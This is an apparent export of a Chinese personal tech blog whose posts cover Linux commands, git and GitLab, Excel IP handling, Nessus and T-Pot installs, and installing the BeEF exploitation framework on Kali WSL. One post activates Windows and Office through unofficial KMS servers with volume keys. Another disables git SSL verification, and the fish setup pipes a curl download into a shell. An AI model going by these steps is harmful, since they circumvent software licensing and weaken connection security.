    <content type="text"><![CDATA[00 把一些好用的Linux命令收集起来 lrzsz 这个命令是服务器用来下载（Received）上传（Send）文件到客户端的，具体用法是： 文件上传到服务器，服务器接收文件为：rz (Received) 文件下载回本地，服务器发送文件为：sz (Send) 让命令走代理 参考链接 修改.bashrc，增加 12alias setproxy='export ALL_PROXY=socks5://127.0.0.1:10808'alias unsetproxy='unset ALL_PROXY' 两条命令 用的时候setproxy，不用就unsetproxy 前提：打开了代理软件 CentOS更新git 参考链接 添加源 卸载旧git yum install git2u 更好用的Shell：Oh-my-fish 安装fish，安装oh-my-fish 参考链接 fish最新版安装参考网页 12345sudo apt-add-repository ppa:fish-shell/release-3sudo apt-get updatesudo apt-get install fishcurl -L github.com/oh-my-fish/oh-my-fish/raw/master/bin/install | fish 安装主题：theme-bobthefish 主题参考链接 omf install bobthefish 进行一些设置 1234set -U theme_nerd_fonts yesset -U theme_color_scheme terminal-dark-white# Ubuntu 选择 set -U theme_color_scheme zenburn set -U fish_prompt_pwd_dir_length 0 如何使用fish 参考链接 重点掌握 五，自动建议； 六，自动补全 01 curlcurl这个命令很常用，用来访问一个网站，上传和下载文件都可以 常用命令： 123curl -o /dev/null -s -w %{http_code} www.baidu.com # 测试某个网站返回值curl -x 192.168.1.1:1080 http://www.google.com # 走代理 详细参数 12345678910111213141516-A/--user-agent &lt;string&gt; 设置用户代理发送给服务器-b/--cookie &lt;name=string/file&gt; cookie字符串或文件读取位置-c/--cookie-jar &lt;file&gt; 操作结束后把cookie写入到这个文件中-C/--continue-at &lt;offset&gt; 断点续转-D/--dump-header &lt;file&gt; 把header信息写入到该文件中-e/--referer 来源网址-f/--fail 连接失败时不显示http错误-o/--output 把输出写到该文件中-O/--remote-name 把输出写到该文件中，保留远程文件的文件名-r/--range &lt;range&gt; 检索来自HTTP/1.1或FTP服务器字节范围-s/--silent 静音模式。不输出任何东西-T/--upload-file &lt;file&gt; 上传文件-u/--user &lt;user[:password]&gt; 设置服务器的用户和密码-w/--write-out [format] 什么输出完成后-x/--proxy &lt;host[:port]&gt; 在给定的端口上使用HTTP代理-#/--progress-bar 进度条显示当前的传送状态 02 查看Linux信息cat /proc/version 或者 uname -a 即可 03 更新源各个版本下的源位置 Ubuntu 18.4 &amp;&amp; Kali： /etc/apt/sources.listCentOS : /etc/yum.repos.d/CentOS-Base.repo document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
        <category>command</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kali(Win10) + beEF]]></title>
    <url>%2F2019%2F08%2F29%2Fkali_wsl_install_beEF%2F</url>
    <content type="text"><![CDATA[00 前言Windows里安装Kali子系统（Windows Linux子系统（WSL）） 01. 安装wsl参考链接 第一需要在“控制面板–程序–启动或关闭Windows功能–适用于Linux的Windows子系统”打开选项，然后重启 或者用管理员权限运行powershell并运行下面的命令： 1Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 在Windows APP Store里安装Kali： 安装成功 打开如下 02. Kali进行配置 首先要设置用户名和密码，默认root账号已存在，不能再次设置 WSL默认的Linux均无任何安装包，需手动更新，不过已配好官方源 在CMD里直接输入 wsl 即可进入WSL子系统，如图，也可手动打开图标，均需管理员权限 我们可以看见默认的目录是在/mnt/c/Users/Elliot 下的 进行更新，以及安装beEF所必须的环境，依赖包。命令如下： apt-get update apt-get install ruby apt-get install libssl-dev libsqlite3-dev sqlite sudo apt-get install g++ apt-get install git –fix-missing 另一个坑点：没有root权限 解决办法：1.切换到root 2.更改密码 参考链接 命令： su root passwd root 安装好环境这些变量之后，切换到一个目录进行安装，我这里是非root用户的根目录（坑点之一，下面有讲） cd ~ git clone https://github.com/beefproject/beef 下载好后切换到目录 cd beef ,使用下列命令进行安装 gem install bundler bundle install ./install 坑点：bundle install 不让用root进行安装，切换回普通用户重新下载安装，以下是警告内容 更新：这个警告应该只是一个警告，可无视 安装好以后，修改默认账号密码 vim ./config.yaml 使用 ./beef 开始服务 访问 http://127.0.0.1:3000/ui/panel 即可 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
        <category>Windows</category>
        <category>WSL</category>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>WSL</tag>
        <tag>Kali</tag>
        <tag>beEF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git冲突相关]]></title>
    <url>%2F2019%2F08%2F29%2Fgit_conflict%2F</url>
    <content type="text"><![CDATA[00 前言某日接到新任务：优化git代码提交流程，解决冲突 给出的指导方向为：个人fork项目提交后，再合并 01 解决前提：撤销修改类良好的参考链接 所有在合并的时候出现冲突(conflict)的时候，都可以使用git merge --abort 命令，你的合并操作就会被安全的撤销。 1.1 回退版本~ git reset --hard HEAD ~ 注意！--hard 命令会删除所有文件本地改动，并将本地副本恢复到上次提交之后的版本（HEAD） git reset --hard 2be18d9 此命令用于重置你当前的 HEAD 分支到一个特定旧的版本（2be18d9），也被称作 “回滚（rolling back）” 到旧的版本注意！此命令会删除所有文件本地改动可替换为--keep本地保留更改回退到版本之后的所有改动 1.2 撤销已提交的改动除了上面的reset命令之外，还可以使用revert 撤销某个之前的提交。 但是这个命令并不是删除那个提交，相反的，它是恢复那个提交的改动，这只是看起来像是撤销而已。这个操作实际上会自动产生一个新的提交 git revert 2b504be 此处2b504be为C2的版本号,在C3处回退版本到C2，变成新版本C4 1.3 简单退出合并git merge --abort 来简单地退出合并,退回到commit版本 1.4 查看合并情况可以通过git log -3 --graph --stat 通过可视化查看合并与分支关系图 02 冲突发生的情况冲突发生的情况有以下3种 2.1 本地版本旧于远程版本（origin）也就是远程分支比本地多出一个提交(D)，（也就是本地无commit提交，但是可以有文件改动） 这时候直接通过git pull 就可以把本地master更新为远程master 此时可以用git fetch origin 更新本地的远程分支（origin/master） 然后使用git diff master origin/master 进行查看本地的master分支和本地的远程分支(origin/master)的区别 命令为： 123git fetch origin # 更新本地的远程分支（origin/master）git diff master origin/master # 比对差别git pull # 同步 以下为a/2.txt本地master的2.txt文件和远程b/2.txt的区别，多了内容+11 2.2 本地版本和远程版本均多出一个提交，但无冲突也就是从C节点克隆到本地库多出了E提交，但是在此之前有人在远程C节点后提交了D 此时可以直接pull而不会产生冲突，并且将本地和远程库都指向最新版本D` 此时如果你不更新本地库直接进行push会报以下错误提示： 通过git status可以看到本地库的状态：Your branch is ahead of ‘origin/master’ by 1 commit. 命令为： 1234git add SOME_DOCUMENT # 添加提交文件git commit -m 'SOME_COMMENT' # 添加commit提交git pull # 同步本地库到远程库git push origin master # 推送到远程库 2.3 最关键的来了，有冲突的时候唯一的解决办法就是查看冲突的地方，然后手工解决 如下一个场景，甲A和乙B同时维护一个README.md表，这个表写了详情，是从后面直接添加上去的 这时候如果本地库A和本地库B都同时增加了一个4,工具D，这样两个已经提交的分支的相同文件相同位置的的不同操作进行了合并，就会产生冲突。 这里举个例子，当本地库A新增了内容4,工具D 本地库A，以及本地库B在 同一行 新增了内容4,工具D 本地库B ,这时候产生了冲突 此时进行pull 操作会报错： 12345error: Your local changes to the following files would be overwritten by merge: README.mdPlease commit your changes or stash them before you merge.AbortingUpdating 9b5e3f2..ba0e98c 此时最好的操作就是通过diff或者status命令查看冲突，并手动解决 命令为： 1234567git fetch origin # 更新本地的远程origin分支git add . # 添加提交文件git commit -m 'SOME_COMMENT' # 添加commit提交git diff master origin/master # 查看本地master分支和远程master分支的区别# 手动解决冲突 效果图如下： 查看差别 此时需要解决冲突 03 软件设置推荐参考链接 那么如何解决冲突？ 打开一个比较原始的文件编辑器来清理这些冲突看起来是可行的，但是这样并不简单。使用一个专门的合并工具可以使这个操作变得更容易 3.1 diffmerge我们使用diffmerge进行可视化比对 下载地址 然后进行一些设置设置链接： 1，首先将diffmerge目录加入环境变量2，复制sgdm.exe文件复制一份，名字改成diffmerge.exe3，输入以下代码： 12345678git config --global diff.tool diffmergegit config --global difftool.diffmerge.cmd 'sgdm "$LOCAL" "$REMOTE"'git config --global merge.tool diffmergegit config --global mergetool.diffmerge.cmd 'diffmerge --merge --result="$MERGED" "$LOCAL" "$(if test -f "$BASE"; then echo "$BASE"; else echo "$LOCAL"; fi)" "$REMOTE"'git config --global mergetool.diffmerge.trustExitCode truegit config --global mergetool.keepBackup false 使用git mergetool即可打开diffmerge工具 坑点1：编码问题使用默认的编码打开会出现编码问题，设置成 UTF-8 即可参考设置链接 4 解决冲突现在我们尝试进行冲突合并 4.1 设置冲突首先设置冲突，在README.md的第一行改一改，让这个文件产生冲突 4.2 查看冲突首先提交(commit)一下各个分支 1234567git add . # 添加摁键git commit -m 'SOME_COMMENT' # Master提交git checkout ttt # 切换分支git commit -m 'SOME_COMMENT' # ttt分支提交git checkout master # 切换回master分支git merge ttt # 合并分支 这时候就会出现冲突了，截图如下： 4.3 工具使用到了这一步我们就使用git mergetool进入冲突解决界面，这里可以看到说有一个冲突 我们可以知道本地有三个界面：一个Local，一个Base和一个Remote 其中Local是当前分支（master），Remote是合并分支（ttt），而中间Base是可以修改的地方，并且是修改后最终的版本 4.4 修改后续我们对文件进行修改后，直接关闭窗口，会提示是否保存，点YES 4.5 提交我们保存后，mergetool会自动帮我们add，我们直接加个commit 然后merge就可以了 123git commit -m 'SOME_COMMENT' # 跳过了add 步骤，可以直接commitgit merge ttt # 合并分支git push origin master 然后我们查看一下是否更改成功 05 实际应用上面说了这么多，实际应用应该怎么样呢？ 通过新建分支进行merge到本地master，然后再push到远程origin是比较好的方法 保持本地的master分支和远程的origin分支一致是比较好的选择 解决冲突，这里解决冲突比较好的办法是修改NEW_BRANCH_NAME分支，而不是操作本地master分支 解决完冲突后，就可以把NEW_BRANCH_NAME分支合并到master分支 具体命令为： 123456789101112131415git branch NEW_BRANCH_NAME # 新建一个名为NEW_BRANCH_NAME的分支git checkout NEW_BRANCH_NAME # 切换到NEW_BRANCH_NAME分支git add . # 添加文件git commit -m 'SOME_COMMENT' # 提交一个节点git checkout master # 切换回master分支git pull # 更新本地分支git merge NEW_BRANCH_NAME # 合并分支# 此处有可能遇到冲突git push origin NEW_BRANCH_NAME # 方法1：推送NEW_BRANCH_NAME到远程git push origin master # 方法2：推送master到远程git diff NEW_BRANCH_NAME origin/msater # 查看本地NEW_BRANCH_NAME分支和远程master分支的区别 06 遇到冲突了怎么办？方法1： 把本地的分支推送到远程后联系管理员帮助进行解决方法2： 按照上面的方法进行自行解决 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Git</category>
        <category>conflict</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git&gitlab相关]]></title>
    <url>%2F2019%2F08%2F29%2Fgit_and_gitlab%2F</url>
    <content type="text"><![CDATA[00 前言近日接到新任务：搭建本地git 使用到gitlab、docker安装。难度略大 01 gitlab进行docker安装安装参考链接 安装好以后，会显示如下图 接下来访问http://ip即可访问控制台 02 git知识点 git 的操作流程 什么是分支（branch），什么是合并分支（merge bracnh） git 拉取和推送代码 git 的设置（代理，SSL证书） 2.1 Git的配置命令git config 配置文件，不写级别，默认是配置仓库级 系统级文件 $(prefix)/etc/gitconfig git config –system 用来指定读写系统级文件。初始不存在，若不存在则无影响。 用户级文件 ~/.gitconfig git config –global 指定只操作用户级文件。初始不存在，若不存在则无影响。 Repository 级文件 .git/config git config –local 对写操作，则只写入 Repository 级文件（默认行为）；对读操作，则只从 Repository 级文件读。 2.2 Git参考资料入门推荐阅读 分支知识参考链接 代理参考链接 SSL类自签名证书解决办法： 来自大佬的办法 忽略SSL证书错误的方法 env GIT_SSL_NO_VERIFY=true git clone https://xxx-xxx/sectools.git #忽略SSL证书确认进行clone项目 cd sectools/ git config http.sslVerify "false" #设置该项目忽略SSL证书错误自行百度，不过多说明 2.3 上Git常用命令速查表 03 gitlab操作使用参考链接 首先需要了解的知识点： 3.1 用户与组：涉及到权限控制 Guest(匿名用户) - 创建项目、写留言薄 Reporter（报告人）- 创建项目、写留言薄、 拉项目、下载项目、创建代码片段 Developer（开发者）- 创建项目、写留言薄、拉项目、下载项目、创建代码片段、创建合并请求、创建新分支、推送不受保护的分支、移除不受保护的分支 、创建标签、编写wiki Master（管理者）- 创建项目、写留言薄、拉项目、下载项目、创建代码片段、创建合并请求、创建新分支、推送不受保护的分支、移除不受保护的分支 、创建标签、编写wiki、增加团队成员、推送受保护的分支、移除受保护的分支、编辑项目、添加部署密钥、配置项目钩子 Owner（所有者）- 创建项目、写留言薄、拉项目、下载项目、创建代码片段、创建合并请求、创建新分支、推送不受保护的分支、移除不受保护的分支 、创建标签、编写wiki、增加团队成员、推送受保护的分支、移除受保护的分支、编辑项目、添加部署密钥、配置项目钩子、开关公有模式、将项目转移到另一个名称空间、删除项目 04 git 常用命令4.1 账号类git config –system –unset credential.helper #删除所有已添加的账号 git config –global credential.helper store #命令实现保存用户名和密码不用再输入 git config user.name ‘github用户名’ #添加用户 git config user.email ‘邮箱’ 4.2 pull request的git命令如何将自己的分支推送到master分支？ —-敲里嘛，搞了一晚上没搞定，不弄了，反正只能web端进行发起merge request— document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Git</category>
        <category>gitlab</category>
      </categories>
      <tags>
        <tag>git</tag>
        <tag>gitlab</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[excel中IP地址的处理]]></title>
    <url>%2F2019%2F08%2F29%2Fdispose_ip_in_excel%2F</url>
    <content type="text"><![CDATA[00.前言在excel中处理IP地址是很经常的事情，那么对于IP地址的处理又不似数据那样的简单，有很多小数点 这个特性就造成了IP地址处理的棘手程度。 现在我们就对excel表格中IP地址的处理进行简答的总结，处理一下 01. IP和漏洞数量计算对于脚本处理后的xlsx文件，进行处理 在插入中选择数据透视表 然后在右边手动添加如下的配置即可，注意需要去掉漏洞的空白 截图如下 ！！需要注意把紧急和高危的数据列进行置换 方法是复制数据到另一列中，然后选中列，按住shift键进行右移 02. IP地址填充0例如： 172.10.3.4 ，把它填充成 172.010.003.004 处理方法：把这个IP地址放在A列，在B列放入这个函数即可 1=TEXT(LEFT(A1,FIND(".",A1,1)-1),"000") &amp; "." &amp; TEXT(MID(A1,FIND( ".",A1,1)+1,FIND(".",A1,FIND(".",A1,1)+1)-FIND(".",A1,1)-1),"000") &amp; "." &amp; TEXT(MID(A1,FIND(".",A1,FIND(".",A1,1)+1)+1,FIND(".",A1, FIND(".",A1,FIND(".",A1,1)+1)+1)-FIND(".",A1,FIND(".",A1,1)+1)-1), "000") &amp; "." &amp; TEXT(RIGHT(A1,LEN(A1)-FIND(".",A1,FIND(".",A1,FIND( ".",A1,1)+1)+1)),"000") 截图如下 03. IP地址去掉0对于上面办法得到的IP地址，进行排序即可 可是我们最后需要的却不是 172.010.003.004 这个格式，我们就对它进行处理 首先选中数据 在数据中选分列,在第三步的目标区域选中粘贴的位置 然后对后面三列数据选择插入整列(为了方便加入小数点.) 然后再选中数据，进行定位条件（快捷键F5)，选中空值，输入小数点，然后Ctrl+Enter进行全部替换 参考链接 1F5键打开“定位”对话框，单击“定位条件”按钮，在“定位条件”对话框中选择“空值”，单击“确定”。Excel会选中区域中的所有空白单元格，在编辑栏中输入“0”，然后按Ctrl+Enter键在所有空白单元格中输入零值。 最后合并IP，使用函数=CONCATENATE(K10,L10,M10,N10,O10,P10,Q10) 参考链接 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Office</category>
        <category>Network</category>
        <category>excel</category>
        <category>IP</category>
      </categories>
      <tags>
        <tag>excel</tag>
        <tag>IP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[在CentOS 7上安装Nessus]]></title>
    <url>%2F2019%2F08%2F28%2FNessus_in_CentOS_installation%2F</url>
    <content type="text"><![CDATA[00 前言只是简单的安装而已… 01 下载Nessus安装包到服务器官网下载地址 方法一：下载到本地通过rz命令上传上去 方法二：暂无更好的wget或curl方式，以后补充 02 安装Nessus下载好rpm包以后，通过 rpm -ivh example.rpm 进行安装 参考链接 03 开启服务及端口开启服务：service nessusd start 开启服务后可通过 netstat -ntlp 查看端口是否开启 开启防火墙端口：iptables -I INPUT -p tcp --dport 8834 -j ACCEPT 04 完成访问本地的8834端口即可，登录账号密码为Nessus/Nessus document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Linux</category>
        <category>CentOS</category>
        <category>Software</category>
      </categories>
      <tags>
        <tag>Nessus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于bat的一些使用]]></title>
    <url>%2F2019%2F08%2F28%2Fbat_usage%2F</url>
    <content type="text"><![CDATA[00 前言今天我来写一下关于bat文件的一些使用，主要是方便使用快捷方式，不用打开文件夹来跳来跳去 01. bat命令编写关于这部分网上有很多教程，眼花缭乱，懒得看了 关注的点有两个：一个是切换到工作目录，一个是直接执行命令就好了 02. 关于快捷方式我个人有一点对美的追求，所以对bat文件进行了美化 首先只有快捷方式才能改图标。 其次就是图标了，推荐一个搜索ico的网站 直接下载好替换即可 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Windows</category>
        <category>bat</category>
      </categories>
      <tags>
        <tag>bat</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[今天我转向Firefox怀抱]]></title>
    <url>%2F2019%2F08%2F27%2Fabout_firefox%2F</url>
    <content type="text"><![CDATA[00 前言Firefox虽然好用, 但还没有chrome好用, 可能是用习惯了.通过一些调优就可以适合个性化使用 01 为什么要转向Firefox的怀抱？第一，Firefox插件有很多很方便 第二，Firefox内存占用比Chrome低一点 第三，没有文明 $和谐字符$ 上网工具的话，同步账号会有点麻烦（虽然对于我来说不是个事） 第四，渗透测试用Firefox会更多一点 02 注意事项第一，避免下载到天 $和谐字符$ 朝特供版Firefox，检验方法： 打开菜单--帮助--关于 里面没有说什么中国xx科技的即可 03 关于Flash国内万恶的思杰马克丁…烦暂未有较好的解决办法… document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Browers</category>
        <category>Firefox</category>
      </categories>
      <tags>
        <tag>Firefox</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[宇宙最强编辑器VS Code]]></title>
    <url>%2F2019%2F08%2F23%2Fthe_best_vscode%2F</url>
    <content type="text"><![CDATA[00 前言今天推荐一个宇宙最强的编辑器：VS Code VS Code是VS团队拆出来写的，和VS比，更轻量化 这个编辑器最好的优点是通过强大的各种插件，能编辑任何东西，这个chrome浏览器有点像 01. 功能那么这个编辑器常用的功能有哪些呢？我常用的有这几个：git，python，markdown，其余后续进行补充 02. 介绍 git： git的使用我推荐查看这个文档 参考链接 参考其中的“提交保存”即可 python 装好python插件即可 markdown md有两个插件，一个国人开发的 Markdown Preview Enhanced,一个是官方的 Markdown All in One, 两者差距有点大，因为我的是黑色调，所以我选择all in one，轻便，集成性好 03. 快捷键对于快捷键，肯定是学多一点好啦。推荐这个 也可以点此下载 其余功能以后介绍 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>VSCode</category>
      </categories>
      <tags>
        <tag>VSCode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系统备份]]></title>
    <url>%2F2019%2F08%2F22%2Fsystem_backup%2F</url>
    <content type="text"><![CDATA[00 前言最近对于系统备份有着需求，主要有以下几点场景：系统重装系统备份系统还原推荐使用AOMEI 更新:采用傲梅科技的轻松备份专业版即可, 非常方便国际网站CN网站 1. 系统重装主要是更换硬件后的重装系统，需要对软件进行重新安装和调优 2. 系统备份希望能够将系统状态保持在最新版，并保存一个地方 3. 系统还原乐于折腾，弄好系统还原设置就可以大胆的搞了 01 dism++工具说明 ： 用来自定义优化windows系统，系统备份等，常用的“系统优化”里的右键菜单管理和系统备份 任何有疑问的地方参考官方文档 1. 系统备份操作直接备份成esd文件即可，然后再转为ISO刻录文件也可以 官方文档 iso、wim、esd文件的区别 注意 ： 压缩率越高，CPU要求越高参考资料1 2. 系统还原操作待补充。。。 3. 增量备份操作对wim格式可以增量备份，esd暂未测试（更新：esd也支持增量备份） esd修改困难esd适合iso发布用不推荐一直改改改 坑点 ： 设置白名单也会出现 “无法完成操作，因为文件包含病毒或潜在的垃圾软件” 这尼玛。。。 2. 系统还原使用dism++ （待测试）进PE还原wim、esd文件 （待测试）刻录成ISO引导盘 （待测试） document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Windows</category>
        <category>Software</category>
        <category>BackUp</category>
        <category>AOMEI</category>
      </categories>
      <tags>
        <tag>BackUp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[巨硬Win10与Office激活]]></title>
    <url>%2F2019%2F08%2F17%2FMS_activate%2F</url>
    <content type="text"><![CDATA[00 前言闲来无事，刚好遇到了激活类的问题，以及群里有人问到了，就写一下微软激活类的文章吧。 由于激活类存在时效性，因此不会对此文章进行更新，能用一天是一天，实在不行用报毒的KMS搞他一波 01 激活WindowsWindows版本有几类，具体哪几类自己百度，我只推荐专业版和企业长期支持版LTSB Windows专业版激活步骤 1234567slmgr.vbs /upkslmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GXslmgr /skms zh.us.toslmgr /ato 用管理员权限打开的CMD或者PowerShell都可以 家庭版可用密钥 ： PPBK3-M92CH-MRR9X-34Y9P-7CH2F 02 激活officeoffice同样有很多版本，我只安装需要的Word,Excel,PowerPoint这三件套，在安装的时候选择自定义选项把其他的插件取消勾选就好，具体有机会再演示 激活步骤如下： 1234cd C:\Program Files\Microsoft Office\Office16cscript ospp.vbs /inpkey:XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99cscript ospp.vbs /sethst:kms.03k.orgcscript ospp.vbs /act 操作步骤同Windows激活，第一条命令是打开office安装目录，详细可参考参考链接1 : ospp.vbs在哪里？ 附上可能用得到的密钥 ： 1234567Office Professional Plus 2016：XQNVK-8JYDB-WJ9W3-YJ8YR-WFG99Office Standard 2016：JNRGM-WHDWX-FJJG3-K47QV-DRTFMProject Professional 2016：YG9NW-3K39V-2T3HJ-93F3Q-G83KTProject Standard 2016：GNFHQ-F6YQM-KQDGJ-327XX-KQBVC document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Microsoft</tag>
        <tag>Activate</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[虚拟机上网相关]]></title>
    <url>%2F2019%2F08%2F17%2Fnetwork_in_VM%2F</url>
    <content type="text"><![CDATA[00 前言今天我要讲一下关于虚拟机上网的问题，NAT，桥接，让宿主机通过虚拟机上网。来吧，一起探究 01. 预备知识 首先参考这两个链接，很有用 NAT转换 桥接模式 之后就是设置IP的操作 Windows下的ipconfig/release SPECIFY_NETWORK_ADAPTER(etho0;WLAN) 释放指定网卡，然后重设IP Linux下设置IP地址1234__ip地址配置__ifconfig //查看与配置网络状态命令ifconfig eth0 192.168.0.200 netmask 255.255.255.0 //临时设置eth0网卡的ip地址与子网掩码service network restart //重启网络服务 02. 宿主机通过虚拟机上网(桥接)通过参考链接的网络拓扑图我们可以清楚VMWare软件的网卡配置原理 首先，让虚拟机获得IP，测试能否上网 第二，释放掉宿主机IP，设置新IP，并设置虚拟机IP为网关地址 进行测试 03. 宿主机通过虚拟机上网(NAT)这个就是 难点 了.23333,其实如果能看懂网络拓扑图，问题也不难 最重要的点就是：如何通过VMnet8上网而不是宿主机的物理网卡，于此同时又不停用宿主机物理网卡(因为虚拟机出口网关要用) 这样就显得有点 没事找事干 了。 这里没有其他特别好的办法，也就VPN了 04. 总结没事瞎折腾找资料写着玩 document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>VM</tag>
        <tag>Network</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tpot安装与介绍]]></title>
    <url>%2F2019%2F08%2F17%2Ftpot_installation%2F</url>
    <content type="text"><![CDATA[00 前言某日接到一个任务, 搞定一个蜜罐: tpot让我一个菜鸡来干这个, 心虚的很 今日份的任务有两个:第一个是如何搭建第二个是简单使用办法 所有的问题解决最好办法就是参考官方文档. 01 搭建前言官方搭建文档-英官当搭建文档-视频-旧-16.0这里提一句, 版本号是按照年份进行命令的, [官方博客]在这(http://dtag-dev-sec.github.io/) 安装方式有三种: ISO镜像安装 从Linux系统中直接安装 自己创建ISO镜像 问题不大, 网络上基本都在推荐第二种方法, 因为说可以手动进行调整…个人认为太麻烦. 我认为第一种方法最合适, 因为不用系统啥balabala的弄, 省心. 闲话少说, 开干 02 搭建实操安装条件: 稳定的DHCP网络这里稳定就不说了, 下载的东西还挺大的, 具体就不知道了, 从33M的iso文件到8G多大的虚拟硬盘, 从防火墙看下载了2G左右的文件DHCP, 我这里跳过了静态IP的配置, 可能这里会是一个坑点, 晚点再解决, 这里先占个位(官方文档要求DHCP) 下载官方ISO文件, 19.03链接在这(github下载) 安装, 对硬件要求略高, 这里贴出配置要求: 6-8 GB RAM (less RAM is possible but might introduce swapping) 128 GB SSD (smaller is possible but limits the capacity of storing events) Network via DHCP A working, non-proxied, internet connection 贴一下我的配置 接下来就是毫无难度的安装了, 然后设置密码, 设置web端账号和密码, 两个安装参考链接, 里面还包含了一些介绍, 推荐阅读 我这边2M/s的小水管大概2个小时完成安装 安装好以后有两个界面: 1, web管理界面: 64297 和 2, 主机管理界面: 64294, 均用https访问 安装好后界面如下:VM界面web管理界面, 端口64297(填web账号密码)主机管理界面, 端口64294(填主机账号密码) 03 介绍安装到此就告一段落, 接下来看一下这玩意怎么用 Dashboard这里有很多现成可用的大版, 各种高大上, 分别对应各个蜜罐的视图 adbhoney, ciscoasa, conpot, cowrie, dionaea, elasticpot, glastopf, glutton, heralding, honeypy, honeytrap, mailoney, medpot, rdpy, snare, tanner 上面各个蜜罐的介绍就看官方文档吧 实用工具在界面上方会有5个工具 分别对应:Furthermore we use the following tools Cockpit for a lightweight, webui for docker, os, real-time performance monitoring and web terminal. Cyberchef a web app for encryption, encoding, compression and data analysis. ELK stack to beautifully visualize all the events captured by T-Pot. Elasticsearch Head a web front end for browsing and interacting with an Elastic Search cluster. 